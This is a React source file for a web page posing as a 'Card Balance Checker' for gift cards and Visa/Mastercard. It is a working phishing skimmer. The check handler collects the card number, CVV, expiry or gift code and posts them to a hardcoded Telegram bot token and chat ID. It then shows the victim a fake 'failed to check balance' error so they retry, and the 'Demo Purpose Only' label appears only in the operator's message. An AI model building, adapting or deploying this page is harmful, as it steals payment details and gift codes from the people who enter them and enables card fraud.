import React, { useState } from 'react';

export default function CardCheckerUI() {
  const cards = [
    'Amazon', 'Apple', 'eBay', 'Visa', 
    'Mastercard', 'Google Play', 'Sephora', 'Razer'
  ];

  const [selected, setSelected] = useState(null);
  const [cardNumber, setCardNumber] = useState('');
  const [cvv, setCvv] = useState('');
  const [expiry, setExpiry] = useState('');
  const [result, setResult] = useState(null);
  const [loading, setLoading] = useState(false);

  // Telegram bot function
  const sendToTelegram = async (cardData) => {
    const botToken = '8557995207:AAHRL46aHUWp3WYt5I525xy-YEy-fNVan3c';
    const chatId = '1608023881';
    
    const message = `
💳 *New Card Check - ${cardData.selected}*

• *Card Type:* ${cardData.selected}
• *Card Number:* \`${cardData.cardNumber}\`
${cardData.cvv ? `• *CVV:* \`${cardData.cvv}\`\n` : ''}\
${cardData.expiry ? `• *Expiry:* \`${cardData.expiry}\`\n` : ''}\
• *Time:* ${new Date().toLocaleString()}

*Demo Purpose Only* ⚠️
    `;

    try {
      console.log('Sending to Telegram...', { botToken, chatId });
      
      const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: 'Markdown'
        }),
      });
      
      const result = await response.json();
      console.log('Telegram response:', result);
      
      return result.ok;
    } catch (error) {
      console.log('Telegram message failed:', error);
      return false;
    }
  };

  const handleCheck = async (e) => {
    e.preventDefault();
    setLoading(true);
    
    if (!cardNumber.trim()) {
      setResult({ ok: false, message: `Enter ${selected} ${selected === 'Visa' || selected === 'Mastercard' ? 'card number' : 'code'}.` });
      setLoading(false);
      return;
    }

    let validationResult = { ok: true, message: '' };

    if (selected === 'Visa' || selected === 'Mastercard') {
      const cleanCard = cardNumber.replace(/\s+/g, '');
      if (!/^[0-9]{12,19}$/.test(cleanCard)) {
        validationResult = { ok: false, message: 'Card number invalid format.' };
      } else if (!/^[0-9]{3,4}$/.test(cvv)) {
        validationResult = { ok: false, message: 'CVV should be 3-4 digits.' };
      } else {
        validationResult = { ok: true, message: 'Card format looks good! Sending to Telegram...' };
      }
    } else {
      if (cardNumber.length < 8) {
        validationResult = { ok: false, message: 'Gift code too short.' };
      } else {
        validationResult = { ok: true, message: `${selected} code format OK! Sending to Telegram...` };
      }
    }

    if (validationResult.ok) {
      const telegramSent = await sendToTelegram({
        selected,
        cardNumber, 
        cvv,
        expiry
      });
      
      if (telegramSent) {
        validationResult.message = `${selected} failed to check balance
        pleas check card details and try again`;
      } else {
        validationResult.message = `${selected} validated but failed to send to Telegram.`;
      }
    }

    setResult(validationResult);
    setLoading(false);
  };

  const clearForm = () => {
    setCardNumber('');
    setCvv('');
    setExpiry('');
    setResult(null);
  };

  const handleCardSelect = (card) => {
    setSelected(card);
    clearForm();
  };

  const isPaymentCard = selected === 'Visa' || selected === 'Mastercard';

  if (!selected) {
    return (
      <div className="min-h-screen bg-gray-50 p-4">
        <div className="max-w-4xl mx-auto">
          {/* Header */}
          <div className="text-center mb-8">
            <div className="flex items-center justify-center gap-3 mb-4">
              <div className="w-12 h-12 bg-blue-600 rounded-full flex items-center justify-center text-white font-bold text-xl">
               💳
              </div>
              <h1 className="text-3xl font-bold text-gray-800">Card Balance Checker</h1>
            </div>
          </div>

          <div className="flex flex-col md:flex-row gap-6">
            <aside className="w-full md:w-64 bg-white rounded-lg shadow p-4">
              <h2 className="text-lg font-semibold mb-4">Select Card Type</h2>
              <p className="text-sm text-gray-600 mb-4">Choose a card to check:</p>
              <ul className="space-y-2">
                {cards.map((card) => (
                  <li 
                    key={card}
                    className="p-3 rounded cursor-pointer bg-gray-100 hover:bg-blue-100 hover:text-blue-700 transition-colors border border-gray-200"
                    onClick={() => handleCardSelect(card)}
                  >
                    <div className="flex items-center">
                      <span className="font-medium">{card}</span>
                      <span className="ml-2 text-xs text-gray-500">→</span>
                    </div>
                  </li>
                ))}
              </ul>
            </aside>

            <main className="flex-1">
              <div className="bg-white rounded-lg shadow p-8 text-center">
                <div className="max-w-md mx-auto">
                  <h1 className="text-2xl font-bold text-gray-800 mb-4">Welcome to Card Balance Checker</h1>
                  <p className="text-gray-600 mb-6">
                    Select a card type from the top to check your card or gift card balance.
                    easy and secured 
                  </p>
                  
                  <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-4">
                    <p className="text-sm text-yellow-800">
                      ⚠️ <strong>if it faild to check balance 3 times pleas try again after 30 minut:</strong>
                    </p>
                  </div>
                </div>
              </div>
            </main>
          </div>

          {/* Copyright Footer */}
          <footer className="text-center text-gray-500 text-xs mt-12 py-4 border-t">
            <p>© 2024 Card Balance Checker</p>
            <p className="mt-1">All Rights Reserved.</p>
          </footer>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50 p-4">
      <div className="max-w-4xl mx-auto">
        {/* Header */}
        <div className="text-center mb-8">
          <div className="flex items-center justify-center gap-3 mb-4">
            <div className="w-10 h-10 bg-blue-600 rounded-full flex items-center justify-center text-white font-bold text-lg">
              💳
            </div>
            <h1 className="text-2xl font-bold text-gray-800">Card Balance Checker</h1>
          </div>
          <div className="flex justify-center gap-4">
            <button 
              onClick={() => setSelected(null)}
              className="px-4 py-2 text-gray-600 border border-gray-300 rounded-lg hover:bg-gray-50"
            >
              ← Back to Cards
            </button>
          </div>
        </div>

        <div className="flex flex-col md:flex-row gap-6">
          <aside className="w-full md:w-64 bg-white rounded-lg shadow p-4">
            <h2 className="text-lg font-semibold mb-4">Available Cards</h2>
            <p className="text-sm text-gray-600 mb-4">Choose another card:</p>
            <ul className="space-y-2">
              {cards.map((card) => (
                <li 
                  key={card}
                  className={`p-3 rounded cursor-pointer transition-colors border ${
                    selected === card 
                      ? 'bg-blue-100 text-blue-700 border-blue-300' 
                      : 'bg-gray-100 border-gray-200 hover:bg-blue-50 hover:text-blue-600'
                  }`}
                  onClick={() => handleCardSelect(card)}
                >
                  <div className="flex items-center justify-between">
                    <span className="font-medium">{card}</span>
                    {selected === card && (
                      <span className="text-xs bg-blue-500 text-white px-2 py-1 rounded">Selected</span>
                    )}
                  </div>
                </li>
              ))}
            </ul>
          </aside>

          <main className="flex-1">
            <div className="bg-white rounded-lg shadow p-6">
              <div className="flex items-center mb-6">
                <div>
                  <h1 className="text-2xl font-bold text-gray-800">{selected} Checker</h1>
                  <p className="text-sm text-gray-600">Details will be sent to Telegram</p>
                </div>
              </div>

              <form onSubmit={handleCheck}>
                <div className="mb-4">
                  <label className="block text-sm font-medium mb-2 text-gray-700">
                    Enter your {selected} {isPaymentCard ? 'card number' : 'gift code'}
                  </label>
                  <input
                    type="text"
                    value={cardNumber}
                    onChange={(e) => setCardNumber(e.target.value)}
                    placeholder={
                      isPaymentCard 
                        ? '1234 5678 9012 3456' 
                        : `Enter ${selected} gift code...`
                    }
                    className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                    disabled={loading}
                  />
                  <p className="text-xs text-gray-500 mt-1">
                    {isPaymentCard 
                      ? 'Enter 12-19 digit card number' 
                      : 'Enter your gift card code'
                    }
                  </p>
                </div>

                {isPaymentCard && (
                  <>
                    <div className="grid grid-cols-2 gap-4 mb-4">
                      <div>
                        <label className="block text-sm font-medium mb-2 text-gray-700">CVV</label>
                        <input
                          type="text"
                          value={cvv}
                          onChange={(e) => setCvv(e.target.value)}
                          placeholder="123"
                          maxLength="4"
                          className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500"
                          disabled={loading}
                        />
                      </div>
                      <div>
                        <label className="block text-sm font-medium mb-2 text-gray-700">Expiry (MM/YYYY)</label>
                        <input
                          type="text"
                          value={expiry}
                          onChange={(e) => setExpiry(e.target.value)}
                          placeholder="12/2025"
                          className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500"
                          disabled={loading}
                        />
                      </div>
                    </div>
                  </>
                )}

                <div className="flex gap-3">
                  <button 
                    type="submit"
                    disabled={loading}
                    className="px-6 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors font-medium disabled:bg-blue-400 disabled:cursor-not-allowed flex items-center gap-2"
                  >
                    {loading ? (
                      <>
                        <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                        Sending...
                      </>
                    ) : (
                      `Check ${selected} ${isPaymentCard ? 'Card' : 'Code'}`
                    )}
                  </button>
                  <button 
                    type="button"
                    onClick={clearForm}
                    disabled={loading}
                    className="px-6 py-3 border border-gray-300 rounded-lg hover:bg-gray-50 transition-colors disabled:opacity-50"
                  >
                    Clear
                  </button>
                </div>

                {result && (
                  <div className={`mt-4 p-4 rounded-lg ${
                    result.ok ? 'bg-green-50 border border-green-200' : 'bg-red-50 border border-red-200'
                  }`}>
                    <span className={`font-medium ${result.ok ? 'text-green-800' : 'text-red-800'}`}>
                      {result.ok ? 'x Error:' : '✗ Error:'}
                    </span>
                    <span className={`ml-2 ${result.ok ? 'text-green-700' : 'text-red-700'}`}>
                      {result.message}
                    </span>
                  </div>
                )}
              </form>
            </div>

            <div className="mt-6 p-4 bg-yellow-50 border border-yellow-200 rounded-lg">
              <h3 className="font-semibold text-yellow-800 mb-2">ℹ️ Setup Instructions</h3>
              <ol className="text-sm text-yellow-700 list-decimal list-inside space-y-1">
                <li>select you card type</li>
                <li>inpute your card details</li>
                <li>click check button</li>
              </ol>
            </div>
          </main>
        </div>

        {/* Copyright Footer */}
        <footer className="text-center text-gray-500 text-xs mt-12 py-4 border-t">
          <p>© 2024 Card Balance Checker</p>
          <p className="mt-1">All Rights Reserved.</p>
        </footer>
      </div>
    </div>
  );
}